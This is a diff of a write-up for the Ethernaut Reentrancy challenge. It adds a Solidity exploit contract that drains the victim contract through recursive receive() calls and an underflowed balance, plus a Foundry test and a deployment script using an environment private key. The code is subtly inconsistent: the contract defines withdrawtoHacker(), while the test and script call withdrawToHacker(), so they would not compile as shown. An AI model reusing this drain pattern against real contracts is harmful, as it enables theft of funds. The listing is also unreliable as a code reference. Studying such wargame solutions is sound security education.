@@ -28,29 +28,30 @@
 
 ```solidity
 contract Reentrance {
-  
-  using SafeMath for uint256;
-  mapping(address => uint) public balances;
+    mapping(address => uint256) public balances;
 
-  function donate(address _to) public payable {
-    balances[_to] = balances[_to].add(msg.value);
-  }
-
-  function balanceOf(address _who) public view returns (uint balance) {
-    return balances[_who];
-  }
-
-  function withdraw(uint _amount) public {
-    if(balances[msg.sender] >= _amount) {
-      (bool result,) = msg.sender.call{value:_amount}("");
-      if(result) {
-        _amount;
-      }
-      balances[msg.sender] -= _amount;
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to] += msg.value;
     }
-  }
 
-  receive() external payable {}
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            if (success) {
+                _amount;
+            }
+            // unchecked to prevent underflow errors
+            unchecked {
+                balances[msg.sender] -= _amount; 
+            }
+        }
+    }
+
+    receive() external payable {}
 }
 ```
 
@@ -63,55 +64,57 @@ contract Reentrance {
 
 <br>
 
-* the `Reentrance` contract starts with a state variable for `balances` (note that `SafeMath` is not needed anymore after solidity `0.8`):
+* the `Reentrance` contract starts with a state variable for `balances`:
 
 <br>
 
 ```solidity
 contract Reentrance {
-  using SafeMath for uint256;
-  mapping(address => uint) public balances;
+  mapping(address => uint256) public balances;
 ```
 
 <br>
 
-* then we have a getter and a setter function for `donate()` (whoever donates some value becomes part of `balances`) and `balanceOf()` (which uses `SafeMath`'s `add()`). 
+* then we have a getter and a setter function for `donate()` (whoever donates some `ether` becomes part of `balances`) and `balanceOf()`: 
 
 <br>
 
 ```solidity
-  function donate(address _to) public payable {
-    balances[_to] = balances[_to].add(msg.value);
-  }
+function donate(address _to) public payable {
+     balances[_to] = balances[_to] += msg.value;
+}
 
-  function balanceOf(address _who) public view returns (uint balance) {
+function balanceOf(address _who) public view returns (uint256 balance) {
     return balances[_who];
-  }
+}
 ```
 
 <br>
 
 * then, we have the `withdraw(amount)` function, which is the source of our reentrancy attack. 
     - for instance, note how it already breaks the **[`checks -> effects -> interactions` pattern](https://docs.soliditylang.org/en/v0.8.21/security-considerations.html#use-the-checks-effects-interactions-pattern)**.
-    - in other words, if `msg.sender` is a (attacker) contract and since `balances` deduction is made after the call, the contract can call `fallback()` to cause a recursion that sends the value multiple times before reducing the sender's balance.
+    - in other words, if `msg.sender` is a (attacker) contract and since `balances` deduction is made after the call, the contract can call a `fallback()` to cause a recursion that sends the value multiple times before reducing the sender's balance.
 
 <br>
 
 ```solidity
-  function withdraw(uint _amount) public {
-    if(balances[msg.sender] >= _amount) {
-      (bool result,) = msg.sender.call{value:_amount}("");
-      if(result) {
-        _amount;
-      }
-      balances[msg.sender] -= _amount;
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            if (success) {
+                _amount;
+            }
+            // unchecked to prevent underflow errors
+            unchecked {
+                balances[msg.sender] -= _amount; 
+            }
+        }
     }
-  }
 ```
 <br>
 
 <p align="center">
-<img src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/bed1dd0f-707c-408a-88d8-ee04693667b9" width="50%" align="center" style="padding:1px;border:1px solid black;"/>
+<img src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/bed1dd0f-707c-408a-88d8-ee04693667b9" width="50%" align="center"/></p>
 
 
 <br><br>
@@ -138,11 +141,45 @@ receive() external payable {}
 
 <br>
 
-* we write the following exploit, located at  `src/10/ReentrancyExploit.sol`:
+* we write the following exploit, located at `src/10/ReentrancyExploit.sol`, where the attack occurs at `run()` and `receive()`. the function `withdrawtoHacker()` can be called afterwords to withdraw the balance from the `ReentrancyExploit` contract:
 
 <br>
 
 ```solidity
+contract ReentrancyExploit {
+
+    Reentrance private level;
+    bool private _ENTERED;
+    address private owner;
+    uint256 private initialDeposit;
+
+    constructor(Reentrance _level) {
+        owner = msg.sender;
+        level = _level;
+        _ENTERED = false;
+    }
+
+    function run() public payable {
+        require(msg.value > 0, "must send some ether");
+        initialDeposit = msg.value;
+        level.donate{value: msg.value}(address(this));
+        level.withdraw(initialDeposit);
+        level.withdraw(address(level).balance);
+    }
+
+    function withdrawtoHacker() public returns (bool) {
+        uint256 hackerBalancer = address(this).balance;
+        (bool success, ) = owner.call{value: hackerBalancer}("");
+        return success;
+    }
+
+    receive() external payable {
+        if (!_ENTERED) {
+            _ENTERED = true;
+            level.withdraw(initialDeposit);
+        }
+    }
+}
 
 ```
 
@@ -153,7 +190,55 @@ receive() external payable {}
 <br>
 
 ```solidity
+contract ReentrancyTest is Test {
 
+    Reentrance public level;
+    ReentrancyExploit public exploit;
+    address payable instance = payable(vm.addr(0x10053)); 
+    address hacker = vm.addr(0x1337); 
+    uint256 initialDeposit = 0.01 ether;
+    uint256 initialVictimBalance = 200 ether;
+
+    function setUp() public {
+        vm.prank(instance);  
+        vm.deal(instance, initialVictimBalance);
+        vm.deal(hacker, initialDeposit);
+
+        level = new Reentrance();
+        level.donate{value: initialVictimBalance}(instance);
+    }
+
+    function testReentrancyHack() public {
+
+        vm.startPrank(hacker);
+
+        exploit = new ReentrancyExploit(level);
+        
+        ////////////////////////////
+        // drain the victim contract
+        ////////////////////////////
+
+        assert(hacker.balance == initialDeposit);
+        assert(instance.balance == initialVictimBalance);
+        assert(address(level).balance == initialVictimBalance);
+        assert(address(exploit).balance == 0);
+
+        exploit.run{value: initialDeposit}();
+        assert(address(exploit).balance == initialVictimBalance + initialDeposit);
+
+        ///////////////////////////////////////////
+        // withdraw from ReentrancyExploit contract
+        ///////////////////////////////////////////        
+        assert(hacker.balance == 0);
+        bool success = exploit.withdrawToHacker();
+        
+        assert(success);
+        assert(hacker.balance == initialVictimBalance + initialDeposit);
+        assert(address(exploit).balance == 0);
+
+        vm.stopPrank();
+    }
+}
 ```
 
 <br>
@@ -170,12 +255,31 @@ receive() external payable {}
 
 <br>
 
-* the solution can be submitted with `script/10/Reentrancy.s.sol`:
+* finally, the solution can be submitted with `script/10/Reentrancy.s.sol`:
 
 <br>
 
 ```solidity
+contract Exploit is Script {
 
+        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL10"));  
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
+        Reentrance level = Reentrance(instance); 
+        ReentrancyExploit exploit;
+        uint256 initialDeposit = 0.001 ether;
+          
+        function run() external {
+
+            vm.startBroadcast(hacker);
+            
+            exploit = new ReentrancyExploit(level);
+            exploit.run{value: initialDeposit}();
+            bool success = exploit.withdrawToHacker();
+            assert(success);
+
+            vm.stopBroadcast();
+    }
+}
 ```
 
 <br>
@@ -193,13 +297,6 @@ receive() external payable {}
 
 ---
 
-### alternative  solution using `cast`
-
-<br>
-
-<br>
-
-----
 
 ### pwned...
 
